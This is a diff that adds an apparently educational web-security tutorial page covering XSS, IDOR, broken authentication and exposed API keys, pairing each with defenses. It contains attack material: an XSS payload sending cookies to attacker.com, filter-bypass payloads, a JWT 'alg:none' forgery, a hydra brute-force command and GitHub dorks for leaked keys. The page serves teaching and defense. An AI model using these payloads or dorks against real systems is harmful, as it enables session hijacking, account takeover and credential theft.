@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Level 2 — Medium Vulnerabilities | EthicalHack.dev</title>
+  <link rel="stylesheet" href="assets/css/style.css" />
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="nav-inner">
+    <a href="index.html" class="nav-brand"><span class="brand-icon">&#x1F6E1;</span> EthicalHack<span class="brand-accent">.dev</span></a>
+    <div class="nav-links">
+      <a href="index.html" class="nav-link">Home</a>
+      <a href="level2.html" class="nav-link active">Level 2</a>
+      <a href="level3.html" class="nav-link">Level 3</a>
+      <a href="cbse-case.html" class="nav-link">CBSE Case</a>
+      <a href="cert-in.html" class="nav-link">CERT-In</a>
+      <a href="disclose.html" class="nav-link">Disclose</a>
+    </div>
+    <button class="hamburger" id="hamburger">&#9776;</button>
+  </div>
+</nav>
+
+<div class="container">
+  <div class="page-hero">
+    <span class="page-hero-badge tag-medium">Level 2 &mdash; Medium &bull; CVSS 4.0–6.9</span>
+    <h1>Web Application Vulnerabilities</h1>
+    <p>XSS, IDOR, broken authentication, and exposed API keys — the most common real-world bugs found in bug bounty programs worldwide.</p>
+  </div>
+
+  <div class="info-box box-warn">
+    <span class="info-box-icon">&#9888;</span>
+    <span>All payloads and techniques below are for <strong>authorized lab environments, CTF competitions, and bug bounty programs only</strong>. Never test systems you don't own or have explicit written permission to test.</span>
+  </div>
+
+  <!-- XSS -->
+  <div class="detail-panel" id="panel-xss">
+    <div class="detail-panel-head">
+      <div>
+        <div class="detail-panel-title">&#128269; Cross-Site Scripting (XSS)</div>
+        <div class="detail-panel-sub">CWE-79 &bull; Reflected / Stored / DOM-based &bull; OWASP A03:2021</div>
+      </div>
+      <div style="display:flex;align-items:center;gap:10px">
+        <span class="sev-badge sev-medium">Medium</span>
+        <span class="detail-panel-chev">&#8964;</span>
+      </div>
+    </div>
+    <div class="detail-panel-body">
+      <p class="text-sm text-muted" style="margin-bottom:14px">XSS lets an attacker inject JavaScript into pages seen by other users. The browser trusts the page origin and executes the script with full DOM access — stealing cookies, hijacking sessions, or defacing sites.</p>
+
+      <div class="tab-bar">
+        <button class="tab-btn active" data-group="xss" data-tab="types">Attack Types</button>
+        <button class="tab-btn" data-group="xss" data-tab="payloads">Payloads</button>
+        <button class="tab-btn" data-group="xss" data-tab="defense">Defense</button>
+      </div>
+
+      <div class="tab-panel active" data-group="xss" data-tab="types">
+        <div class="two-col">
+          <div class="mini-card"><div class="mini-card-title" style="color:var(--orange)">Reflected XSS</div><div class="mini-card-body">Payload is in the URL/query parameter and is reflected immediately in the response. Requires victim to click a crafted link.</div></div>
+          <div class="mini-card"><div class="mini-card-title" style="color:var(--red)">Stored XSS</div><div class="mini-card-body">Payload is saved in the database (comment, profile, post) and fires for every user who visits the page — most dangerous.</div></div>
+          <div class="mini-card"><div class="mini-card-title" style="color:var(--blue)">DOM-based XSS</div><div class="mini-card-body">JavaScript reads attacker-controlled input (URL hash, localStorage) and writes it to the DOM without server involvement.</div></div>
+          <div class="mini-card"><div class="mini-card-title" style="color:var(--accent2)">Blind XSS</div><div class="mini-card-body">Payload fires in admin panels or log viewers that the attacker can't see directly — use XSS Hunter to capture callbacks.</div></div>
+        </div>
+      </div>
+
+      <div class="tab-panel" data-group="xss" data-tab="payloads">
+        <div class="slabel">Cookie theft (session hijack)</div>
+        <div class="code-block"><span class="bad">&lt;script&gt;</span>
+  document.location = <span class="string">'https://attacker.com/steal?c='</span> + document.cookie;
+<span class="bad">&lt;/script&gt;</span></div>
+
+        <div class="slabel">Bypass when &lt;script&gt; is filtered</div>
+        <div class="code-block"><span class="comment">// Using event handler attributes:</span>
+<span class="string">" autofocus onfocus="alert(document.domain)</span>
+
+<span class="comment">// SVG-based bypass:</span>
+&lt;svg onload=alert(1)&gt;
+
+<span class="comment">// IMG onerror:</span>
+&lt;img src=x onerror=alert(document.cookie)&gt;</div>
+
+        <div class="slabel">DOM XSS sink</div>
+        <div class="code-block"><span class="comment">// Vulnerable JS — never do this:</span>
+<span class="keyword">const</span> name = location.hash.slice(1);
+document.getElementById(<span class="string">'greeting'</span>).innerHTML = name; <span class="bad">// ← XSS sink</span>
+
+<span class="comment">// Attack URL:</span>
+https://target.com/page<span class="string">#&lt;img src=x onerror=alert(1)&gt;</span></div>
+      </div>
+
+      <div class="tab-panel" data-group="xss" data-tab="defense">
+        <div class="info-box box-safe" style="margin-top:0">
+          <span class="info-box-icon">&#x2705;</span>
+          <div>
+            <strong>Primary fix:</strong> Output-encode all user-controlled data before inserting into HTML.
+            Use framework auto-escaping (React JSX, Angular templates, Django templates) — never raw <code>innerHTML</code>.
+          </div>
+        </div>
+        <div class="code-block"><span class="comment">// WRONG — vulnerable:</span>
+element.innerHTML = userInput;
+
+<span class="comment">// RIGHT — safe alternatives:</span>
+element.textContent = userInput;          <span class="good">// plain text, no HTML parsed</span>
+element.setAttribute(<span class="string">'value'</span>, userInput);  <span class="good">// attribute context</span>
+
+<span class="comment">// Content Security Policy header:</span>
+Content-Security-Policy: default-src <span class="string">'self'</span>;
+  script-src <span class="string">'self'</span> <span class="string">'nonce-RANDOM'</span>;
+
+<span class="comment">// Cookie flags — stop JS reading session cookie:</span>
+Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict</div>
+      </div>
+
+      <div class="slabel" style="margin-top:16px">Impact</div>
+      <div class="impact-row"><span class="impact-label">Confidentiality</span><div class="impact-track"><div class="impact-fill" style="width:70%;background:var(--orange)"></div></div></div>
+      <div class="impact-row"><span class="impact-label">Integrity</span><div class="impact-track"><div class="impact-fill" style="width:60%;background:var(--orange)"></div></div></div>
+      <div class="impact-row"><span class="impact-label">Availability</span><div class="impact-track"><div class="impact-fill" style="width:25%;background:var(--blue)"></div></div></div>
+    </div>
+  </div>
+
+  <!-- IDOR -->
+  <div class="detail-panel" id="panel-idor">
+    <div class="detail-panel-head">
+      <div>
+        <div class="detail-panel-title">&#128100; IDOR — Insecure Direct Object Reference</div>
+        <div class="detail-panel-sub">CWE-639 &bull; Broken Access Control &bull; OWASP A01:2021</div>
+      </div>
+      <div style="display:flex;align-items:center;gap:10px">
+        <span class="sev-badge sev-medium">Medium–High</span>
+        <span class="detail-panel-chev">&#8964;</span>
+      </div>
+    </div>
+    <div class="detail-panel-body">
+      <p class="text-sm text-muted" style="margin-bottom:14px">When an app uses user-supplied IDs to fetch objects without checking ownership. Changing <code>user_id=123</code> to <code>user_id=124</code> returns another user's private data.</p>
+
+      <div class="slabel">Vulnerable API request</div>
+      <div class="code-block"><span class="keyword">GET</span> /api/v1/orders/<span class="bad">7821</span>
+Authorization: Bearer eyJhbGci...
+
+<span class="comment">→ Returns order belonging to user 7821 — not the caller.
+  Server never checks: does the caller OWN order 7821?</span></div>
+
+      <div class="slabel">Exploit — ID fuzzing with Burp Intruder</div>
+      <div class="code-block"><span class="comment"># Step 1 — Intercept a valid request in Burp Suite
+# Step 2 — Send to Intruder, mark the ID as payload position</span>
+<span class="keyword">GET</span> /api/v1/orders/<span class="string">§7821§</span>
+
+<span class="comment"># Step 3 — Number payload: 7800 → 7900
+# Step 4 — Filter results: 200 OK = data found, 403/404 = not found
+# Step 5 — Stop immediately when you confirm access to another user's data</span></div>
+
+      <div class="slabel">UUID IDOR — still vulnerable</div>
+      <div class="code-block"><span class="comment"># Even GUIDs can be IDOR if the server doesn't verify ownership:</span>
+<span class="keyword">GET</span> /docs/<span class="string">3f2504e0-4f89-11d3-9a0c-0305e82c3301</span>
+
+<span class="comment"># If you find a GUID in another user's shared link → test it with your token</span></div>
+
+      <div class="slabel">Defense</div>
+      <div class="code-block"><span class="comment">// Server-side ownership check — ALWAYS required:</span>
+<span class="keyword">const</span> order = await Order.findById(req.params.id);
+<span class="keyword">if</span> (order.userId !== req.user.id) {
+  <span class="keyword">return</span> res.status(<span class="value">403</span>).json({ error: <span class="string">'Forbidden'</span> }); <span class="good">// ✓</span>
+}
+
+<span class="comment">// Or use scoped queries — never return what you haven't filtered:</span>
+<span class="keyword">const</span> order = await Order.findOne({ _id: req.params.id, userId: req.user.id });</div>
+
+      <div class="impact-row" style="margin-top:12px"><span class="impact-label">Confidentiality</span><div class="impact-track"><div class="impact-fill" style="width:85%;background:var(--orange)"></div></div></div>
+      <div class="impact-row"><span class="impact-label">Integrity</span><div class="impact-track"><div class="impact-fill" style="width:70%;background:var(--orange)"></div></div></div>
+    </div>
+  </div>
+
+  <!-- BROKEN AUTH -->
+  <div class="detail-panel" id="panel-auth">
+    <div class="detail-panel-head">
+      <div>
+        <div class="detail-panel-title">&#128275; Broken Authentication</div>
+        <div class="detail-panel-sub">CWE-287 &bull; JWT flaws, session fixation, brute-force &bull; OWASP A07:2021</div>
+      </div>
+      <div style="display:flex;align-items:center;gap:10px">
+        <span class="sev-badge sev-high">High</span>
+        <span class="detail-panel-chev">&#8964;</span>
+      </div>
+    </div>
+    <div class="detail-panel-body">
+      <p class="text-sm text-muted" style="margin-bottom:14px">Flaws in login flows, session tokens, or JWT handling let attackers assume other users' identities without knowing their passwords.</p>
+
+      <div class="tab-bar">
+        <button class="tab-btn active" data-group="auth" data-tab="jwt">JWT Attack</button>
+        <button class="tab-btn" data-group="auth" data-tab="brute">Brute Force</button>
+        <button class="tab-btn" data-group="auth" data-tab="session">Session Fixation</button>
+      </div>
+
+      <div class="tab-panel active" data-group="auth" data-tab="jwt">
+        <div class="code-block"><span class="comment"># JWT "alg:none" attack — library accepts unsigned token:</span>
+
+<span class="comment"># Original JWT header:</span>
+{ <span class="string">"alg"</span>: <span class="string">"HS256"</span>, <span class="string">"typ"</span>: <span class="string">"JWT"</span> }
+
+<span class="comment"># Attacker changes to:</span>
+{ <span class="string">"alg"</span>: <span class="string">"none"</span>,  <span class="string">"typ"</span>: <span class="string">"JWT"</span> }
+
+<span class="comment"># With modified payload (admin escalation):</span>
+{ <span class="string">"user"</span>: <span class="string">"alice"</span>, <span class="string">"role"</span>: <span class="string">"admin"</span>, <span class="string">"exp"</span>: 9999999999 }
+
+<span class="comment"># Remove signature entirely → some libraries accept as valid!</span>
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.PAYLOAD.</div>
+
+        <div class="code-block"><span class="comment"># Fix — always enforce algorithm server-side:</span>
+<span class="keyword">const</span> payload = jwt.verify(token, secret, {
+  algorithms: [<span class="string">'HS256'</span>]  <span class="good">// ← explicitly whitelist, never allow 'none'</span>
+});</div>
+      </div>
+
+      <div class="tab-panel" data-group="auth" data-tab="brute">
+        <div class="code-block"><span class="comment"># Credential stuffing / brute-force (authorized lab only):</span>
+hydra -L users.txt -P rockyou.txt \
+  https-post-form \
+  <span class="string">"/login:username=^USER^&password=^PASS^:Invalid credentials"</span> \
+  -t 16 -f
+
+<span class="comment"># Rate-limit test — check if lockout triggers:</span>
+<span class="keyword">for</span> i in {1..20}; <span class="keyword">do</span>
+  curl -s -o /dev/null -w <span class="string">"%{http_code}\n"</span> \
+    -X POST https://target.lab/login \
+    -d <span class="string">"username=admin&password=wrong$i"</span>
+<span class="keyword">done</span>
+<span class="comment"># If all return 200 or 401 without 429 — no rate limiting</span></div>
+      </div>
+
+      <div class="tab-panel" data-group="auth" data-tab="session">
+        <div class="code-block"><span class="comment"># Session fixation — attacker forces a known session ID:</span>
+
+<span class="comment"># 1. Attacker gets a pre-auth session:</span>
+<span class="keyword">GET</span> /login → Set-Cookie: SESSID=attacker_known_value
+
+<span class="comment"># 2. Tricks victim into using that session (link with cookie set)</span>
+
+<span class="comment"># 3. After victim logs in, SESSID is still attacker_known_value</span>
+<span class="comment"># 4. Attacker uses same SESSID → authenticated as victim</span>
+
+<span class="comment"># Fix — regenerate session ID after login:</span>
+req.session.regenerate(() =&gt; {  <span class="good">// ← must do this on login</span>
+  req.session.user = authenticatedUser;
+});</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- API KEYS -->
+  <div class="detail-panel" id="panel-api">
+    <div class="detail-panel-head">
+      <div>
+        <div class="detail-panel-title">&#128273; Exposed API Keys</div>
+        <div class="detail-panel-sub">CWE-312 &bull; Secret leakage in Git repos / JS bundles &bull; OWASP A02:2021</div>
+      </div>
+      <div style="display:flex;align-items:center;gap:10px">
+        <span class="sev-badge sev-medium">Medium–High</span>
+        <span class="detail-panel-chev">&#8964;</span>
+      </div>
+    </div>
+    <div class="detail-panel-body">
+      <p class="text-sm text-muted" style="margin-bottom:14px">API secrets pushed to public GitHub repos or embedded in frontend JS are scraped by bots within seconds of publication. AWS access keys leaked this way have led to $50,000+ cloud bills within hours.</p>
+
+      <div class="slabel">Scan your own repos with TruffleHog</div>
+      <div class="code-block"><span class="comment"># Install:</span>
+pip install trufflehog3
+
+<span class="comment"># Scan your repo (only run on repos you own):</span>
+trufflehog git https://github.com/YOUR_ORG/YOUR_REPO --only-verified
+
+<span class="comment"># Check git history — deleted files remain in commits:</span>
+git log --all -p | grep -iE <span class="string">"api_key|secret|password|token|aws"</span>
+
+<span class="comment"># GitLeaks (faster, more patterns):</span>
+gitleaks detect --source . --verbose</div>
+
+      <div class="slabel">GitHub dork — find leaks in public repos (OSINT research)</div>
+      <div class="code-block"><span class="comment"># AWS Access Key ID always starts with AKIA:</span>
+<span class="string">"AKIA"</span> filename:.env
+
+<span class="comment"># Stripe live keys:</span>
+<span class="string">"sk_live_"</span> extension:js
+
+<span class="comment"># Generic secret patterns:</span>
+filename:.env DB_PASSWORD
+filename:config.php password</div>
+
+      <div class="slabel">If you find a leaked key — what to do</div>
+      <div class="step-list">
+        <div class="step-item">
+          <div class="step-line"><div class="step-dot" style="background:var(--red);color:#fff">1</div><div class="step-vline"></div></div>
+          <div class="step-content"><div class="step-title">Immediately rotate / revoke the key</div><div class="step-desc">In AWS: IAM → Security credentials → Deactivate. Assume it was already used by bots.</div></div>
+        </div>
+        <div class="step-item">
+          <div class="step-line"><div class="step-dot" style="background:var(--orange);color:#fff">2</div><div class="step-vline"></div></div>
+          <div class="step-content"><div class="step-title">Check access logs for unauthorized usage</div><div class="step-desc">AWS CloudTrail, GCP Audit Logs, Stripe dashboard — look for unusual API calls or resource creation.</div></div>
+        </div>
+        <div class="step-item">
+          <div class="step-line"><div class="step-dot" style="background:var(--green);color:#000">3</div></div>
+          <div class="step-content"><div class="step-title">Remove from git history and prevent recurrence</div><div class="step-desc">Use <code>git filter-repo</code> to purge history. Add pre-commit hooks with <code>detect-secrets</code>. Enable GitHub Push Protection.</div></div>
+        </div>
+      </div>
+
+      <div class="code-block"><span class="comment"># Prevent future leaks — pre-commit hook:</span>
+pip install detect-secrets
+detect-secrets scan &gt; .secrets.baseline
+pre-commit install
+
+<span class="comment"># .env pattern in .gitignore:</span>
+<span class="string">.env
+.env.*
+*.pem
+*_key.json
+credentials.json</span></div>
+    </div>
+  </div>
+
+</div>
+
+<footer class="footer">
+  <div class="container footer-inner">
+    <div class="footer-brand">&#x1F6E1; EthicalHack.dev</div>
+    <div class="footer-links">
+      <a href="level3.html">Level 3 &rarr;</a>
+      <a href="disclose.html">Responsible Disclosure</a>
+    </div>
+    <div class="footer-note">Educational use only. Always get written authorization before testing any system.</div>
+  </div>
+</footer>
+
+<script src="assets/js/nav.js"></script>
+</body>
+</html>
